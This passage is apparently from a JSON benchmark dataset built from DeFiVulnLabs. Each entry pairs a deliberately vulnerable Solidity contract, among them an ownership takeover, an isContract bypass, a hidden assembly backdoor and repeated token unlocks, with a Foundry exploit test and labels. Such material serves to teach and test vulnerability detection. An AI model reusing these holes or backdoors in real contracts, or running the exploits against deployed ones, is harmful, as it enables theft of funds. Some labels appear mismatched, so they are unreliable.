    "language": "solidity",
    "chain": "evm",
    "file_name": "Visibility.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\nimport \"forge-std/Test.sol\";\n\n/*\nName: Improper Access Control Vulnerability\n\nDescription:\nThe default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.\n\nImpact: the owner of the contract can be changed by anyone.\n\nMitigation:\nUse access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions\n \n*/\n\ncontract ContractTest is Test {\n    ownerGame ownerGameContract;\n\n    function testVisibility() public {\n        ownerGameContract = new ownerGame();\n        console.log(\n            \"Before exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        ownerGameContract.changeOwner(msg.sender);\n        console.log(\n            \"After exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "vulnerable_contract_only": "contract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "vulnerability_name": "Improper Access Control Vulnerability",
    "description": "The default visibility of the function is Public. \nIf there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.\n\nThe ownerGame contract has a changeOwner function that is intended to change the owner of the contract.\nHowever, due to improper access control, this function is publicly accessible and \ncan be called by any external account or contract. As a result, an attacker can call this function\nto change the ownership of the contract and take control.",
    "scenario": "",
    "fix_description": "Use access control modifiers: Solidity provides modifiers, such as onlyOwner, \nwhich can be used to restrict the access of functions",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Visibility.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_divmultiply",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Divmultiply.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Issues - Divide before multiply\n\nDescription:\nThe contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) * discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price * discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.\n\nMitigation:Always perform multiplication before division to avoid losing precision.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1599774264437395461\nhttps://blog.solidityscan.com/precision-loss-in-arithmetic-operations-8729aea20be9\n\n*/\ncontract ContractTest is Test {\n    Miscalculation MiscalculationContract;\n    Calculation CalculationContract;\n\n    function testMiscalculation() public {\n        MiscalculationContract = new Miscalculation();\n        console.log(\"Perform Miscalculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract the discount, get the sale price:\",\n            MiscalculationContract.price(80, 90)\n        );\n        console.log(\n            \"Solidity doesn't do decimals, so dividing before multiplying will round to zero. 0.8*90=0\"\n        );\n        console.log(\n            \"---------------------------------------------------------\"\n        );\n        CalculationContract = new Calculation();\n        console.log(\"Perform Correct calculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract  the discount, get the sale price:\",\n            CalculationContract.price(80, 90)\n        );\n        console.log(\"Multiply before dividing is correct. 80*90/100=72\");\n    }\n}\n\ncontract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\ncontract Calculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price * discount) / 100; // correct calculation\n    }\n}\n",
    "vulnerable_contract_only": "contract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "Precision Issues - Divide before multiply",
    "description": "The contracts demonstrate a common issue when performing division operations in Solidity, \nas Solidity doesn't support floating-point numbers. The order of operations can affect the result due to integer truncation.\n\nIn the Miscalculation contract, the function price performs the division before the\nmultiplication (price / 100) * discount. Due to the fact that Solidity truncates integers\nwhen dividing, the result of price / 100 will be 0 if the price is less than 100. \nThis causes the result of the multiplication to be 0 as well.\n\nOn the other hand, in the Calculation contract, the function price performs the multiplication\nbefore the division (price * discount) / 100. This way, the result will be correct as the multiplication\ndoesn't get truncated, only the final result does.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Divmultiply.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_selfdestruct2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Selfdestruct2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nThis excersise is about selfdestructing (deprecated) and force sending ether to a contract\nForce implements neither receive nor fallaback functions. Calls with any value will revert.\n*/\n\ncontract ContractTest is Test {\n    Force ForceContract;\n    Attack AttackerContract;\n\n    function testselfdestruct2() public {\n        ForceContract = new Force();\n        console.log(\"Balance of ForceContract:\", address(ForceContract).balance);\n        AttackerContract = new Attack();\n        console.log(\n            \"Balance of ForceContract:\",\n            address(ForceContract).balance\n        );\n        console.log(\n            \"Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack{value: 1 ether}(address(ForceContract));\n\n        console.log(\"Exploit completed\");\n        console.log(\n            \"Balance of EtherGameContract:\",\n            address(ForceContract).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =\u00f8= /\n (______)__m_m)\n\n*/\n}\n\ncontract Attack {\n    function attack(address force) public payable {\n        selfdestruct(payable(force));\n    }\n}\n",
    "vulnerable_contract_only": "contract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =\u00f8= /\n (______)__m_m)\n\n*/\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "selfdestruct",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "This excersise is about selfdestructing (deprecated) and force sending ether to a contract",
    "description": "This excersise is about selfdestructing (deprecated) and force sending ether to a contract",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Selfdestruct2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_gas-price",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "gas-price.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: txGasPrice manipulation\n\nDescription:\nManipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.\n\nMitigation:  \nTo address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678268482641870849\nhttps://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md\nhttps://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md\nhttps://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331\n*/\n\ncontract ContractTest is Test {\n    GasReimbursement GasReimbursementContract;\n\n    function setUp() public {\n        GasReimbursementContract = new GasReimbursement();\n        vm.deal(address(GasReimbursementContract), 100 ether);\n    }\n\n    function testGasRefund() public {\n        uint balanceBefore = address(this).balance;\n        GasReimbursementContract.executeTransfer(address(this));\n        uint balanceAfter = address(this).balance - tx.gasprice; // --gas-price 200000000000000\n        console.log(\"Profit\", balanceAfter - balanceBefore);\n    }\n\n    receive() external payable {}\n}\n\ncontract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "txGasPrice manipulation",
    "description": "Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.\n\nIn the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. \nThe issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.",
    "scenario": "",
    "fix_description": "To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. \n\nTest:\nforge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/gas-price.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_array-deletion",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Array-deletion.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Array Deletion Oversight: leading to data inconsistency\n\nDescription:\nIn Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior. \n\n\nMitigation:  \nOption1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1677167550277509120\nhttps://blog.solidityscan.com/improper-array-deletion-82672eed8e8d\nhttps://github.com/sherlock-audit/2023-03-teller-judging/issues/88\n*/\n\ncontract ContractTest is Test {\n    ArrayDeletionBug ArrayDeletionBugContract;\n    FixedArrayDeletion FixedArrayDeletionContract;\n\n    function setUp() public {\n        ArrayDeletionBugContract = new ArrayDeletionBug();\n        FixedArrayDeletionContract = new FixedArrayDeletion();\n    }\n\n    function testArrayDeletion() public {\n        ArrayDeletionBugContract.myArray(1);\n        //delete incorrectly\n        ArrayDeletionBugContract.deleteElement(1);\n        ArrayDeletionBugContract.myArray(1);\n        ArrayDeletionBugContract.getLength();\n    }\n\n    function testFixedArrayDeletion() public {\n        FixedArrayDeletionContract.myArray(1);\n        //delete incorrectly\n        FixedArrayDeletionContract.deleteElement(1);\n        FixedArrayDeletionContract.myArray(1);\n        FixedArrayDeletionContract.getLength();\n    }\n\n    receive() external payable {}\n}\n\ncontract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\ncontract FixedArrayDeletion {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    //Mitigation 1: By copying the last element and placing it in the position to be removed.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n\n        // Swap the element to be deleted with the last element\n        myArray[index] = myArray[myArray.length - 1];\n\n        // Delete the last element\n        myArray.pop();\n    }\n\n    /*Mitigation 2: By shifting them from right to left.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        \n        for (uint i = _index; i < myArray.length - 1; i++) {\n            myArray[i] = myArray[i + 1];\n        }\n        \n        // Delete the last element\n        myArray.pop();\n    }\n    */\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n",
    "vulnerable_contract_only": "contract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Array Deletion Oversight: leading to data inconsistency",
    "description": "In Solidity where improper deletion of elements from dynamic arrays can result in data inconsistency. \nWhen attempting to delete elements from an array, if the deletion process is not handled correctly, \nthe array may still retain storage space and exhibit unexpected behavior.",
    "scenario": "",
    "fix_description": "Option1: By copying the last element and placing it in the position to be removed.\nOption2: By shifting them from right to left.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Array-deletion.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_transientstoragemisuse.t",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "TransientStorageMisuse.t.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\n/*\nSIR (Storage Injection via Reentrancy) vulnerability transient storage test\nReference: https://www.coveragelabs.io/blog/post/sir-exploit\nSolidity 0.8.24+ transient storage\n*/\n\n// Simplified transient storage vulnerability demonstration\n\ncontract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\ncontract TransientStorageMisuseTest is Test {\n    SimpleVault vault;\n    \n    function setUp() public {\n        vault = new SimpleVault();\n    }\n\n\n    function testStorageExploit() public {\n        // First, let's check what address we want to get\n        console.log(\"Target address:\", address(this));\n        \n        // Convert the address to uint256\n        uint256 amount = uint256(uint160(address(this)));\n        emit log_named_uint(\"Amount needed\", amount);\n        \n        // Now use this amount in the mint function\n        vault.mint(amount);\n        // Exploit callback\n        vault.SwapCallback(0, \"\");\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "SIR (Storage Injection via Reentrancy) vulnerability transient storage test",
    "description": "SIR (Storage Injection via Reentrancy) vulnerability transient storage test",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/TransientStorageMisuse.t.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_bypasscontract",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Bypasscontract.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Bypass isContract() validation\n\nDescription:\nThe attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.\n\nREF:\nhttps://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/\n*/\n\ncontract ContractTest is Test {\n    Target TargetContract;\n    FailedAttack FailedAttackContract;\n    Attack AttackerContract;\n    TargetRemediated TargetRemediatedContract;\n\n    constructor() {\n        TargetContract = new Target();\n        FailedAttackContract = new FailedAttack();\n        TargetRemediatedContract = new TargetRemediated();\n    }\n\n    function testBypassFailedContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit Failed\");\n        FailedAttackContract.pwn(address(TargetContract));\n    }\n\n    function testBypassContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        AttackerContract = new Attack(address(TargetContract));\n        console.log(\n            \"After exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack is Test {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        vm.expectRevert(\"no contract allowed\");\n        Target(_target).protected();\n    }\n}\n\ncontract Attack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n\ncontract TargetRemediated {\n    function isContract(address account) public view returns (bool) {\n        require(tx.origin == msg.sender);\n        return account.code.length > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n",
    "vulnerable_contract_only": "contract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "contract_check_bypass",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Bypass isContract() validation",
    "description": "The attacker only needs to write the code in the constructor of the smart contract \nto bypass the detection mechanism of whether it is a smart contract.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/Bypasscontract.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_backdoor-assembly",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Backdoor-assembly.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/* \nName: Hidden Backdoor in Contract:\n\nDescription:\nIn this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.\n\nScenario:\nLottery game: anyone can call pickWinner to get prize if you are lucky. \nRefers to JST contract backdoor. many rugged style's contract has similar pattern.\nLooks like theres is no setwinner function in contract, how admin can rug?\n*/\n\ncontract ContractTest is Test {\n    LotteryGame LotteryGameContract;\n\n    function testBackdoorCall() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        LotteryGameContract = new LotteryGame();\n        console.log(\n            \"Alice performs pickWinner, of course she will not be a winner\"\n        );\n        vm.prank(alice);\n        LotteryGameContract.pickWinner(address(alice));\n        console.log(\"Prize: \", LotteryGameContract.prize());\n\n        console.log(\"Now, admin sets the winner to drain out the prize.\");\n        LotteryGameContract.pickWinner(address(bob));\n        console.log(\"Admin manipulated winner: \", LotteryGameContract.winner());\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "vulnerable_contract_only": "contract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "backdoor",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Hidden Backdoor in Contract:",
    "description": "In this contract, an apparently fair 'LotteryGame' contract is subtly designed to allow \na hidden privilege to the contract deployer/administrator. \nThis is achieved through the use of assembly level access to storage variables, \nwhere a referee function is designed to provide an administrative backdoor. \nThe 'pickWinner' function appears to randomly pick a winner, but in reality,\nit allows the administrator to set the winner. \nThis bypasses the usual access controls and can be used to drain the prize pool \nby an unauthorized user, acting as a type of rug pull.\n\nAn attacker can manipulate smart contracts as a backdoor by writing inline assembly. \nAny sensitive parameters can be changed at any time.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Backdoor-assembly.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_incorrect_sanity_checks",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Incorrect_sanity_checks.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse \n\nDescription:\nThe bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. \nThis allows tokens to be unlocked multiple times before the lock period has elapsed, \npotentially leading to significant financial loss.\n \nMitigation:  \nAdd a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.\n\nor fix:\nuint256 amount = locker.amount;\nif (block.timestamp > locker.lockTime) {\n    IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    locker.amount = 0;\n    }\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1681492477281468420\nhttps://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d\n*/\n\ncontract ContractTest is Test {\n    VulnerableBank VulnerableBankContract;\n    BanksLP BanksLPContract;\n    FixedeBank FixedeBankContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        VulnerableBankContract = new VulnerableBank();\n        FixedeBankContract = new FixedeBank();\n        BanksLPContract = new BanksLP();\n        BanksLPContract.transfer(address(alice), 10000);\n        BanksLPContract.transfer(address(VulnerableBankContract), 100000);\n    }\n\n    function testVulnerableBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(VulnerableBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        VulnerableBankContract.createLocker(\n            address(BanksLPContract),\n            10000,\n            86400\n        );\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //vm.warp(88888);\n        //exploit it,\n        for (uint i = 0; i < 10; i++) {\n            VulnerableBankContract.unlockToken(1);\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n\n    function testFixedBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(FixedeBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        FixedeBankContract.createLocker(address(BanksLPContract), 10000, 86400);\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //exploit it, failed.\n        for (uint i = 0; i < 10; i++) {\n            {\n                vm.expectRevert();\n                FixedeBankContract.unlockToken(1);\n            }\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n}\n\ncontract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        